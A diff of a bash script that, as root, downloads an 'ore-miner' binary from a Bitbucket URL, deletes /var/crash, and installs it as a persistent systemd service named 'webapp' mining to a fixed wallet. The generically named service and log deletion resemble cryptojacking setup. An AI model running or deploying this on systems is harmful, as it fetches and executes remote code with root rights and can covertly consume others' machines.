@@ -1,7 +1,7 @@
 #!/bin/bash
 cd /home
 sudo wget https://bitbucket.org/ytvahjd/oree/raw/634d43b58339b4ccac8d05d65c18e3b629c25d8f/ore-miner
-sudo chmod +x *
+sudo chmod +x ore-miner
 sudo rm -rf /lib/systemd/system/webapp.service
 sudo rm -rf /var/crash
 sudo bash -c 'cat <<EOT >>/lib/systemd/system/webapp.service 
@@ -9,7 +9,7 @@ sudo bash -c 'cat <<EOT >>/lib/systemd/system/webapp.service
 Description=gpu1
 After=network.target
 [Service]
-ExecStart= /home/./ore-miner  mine --address HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4 --threads 4 --invcode 888888
+ExecStart= /home/ore-miner mine --address HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4 --threads 4 --invcode 888888
 WatchdogSec=36000
 Restart=always
 RestartSec=60
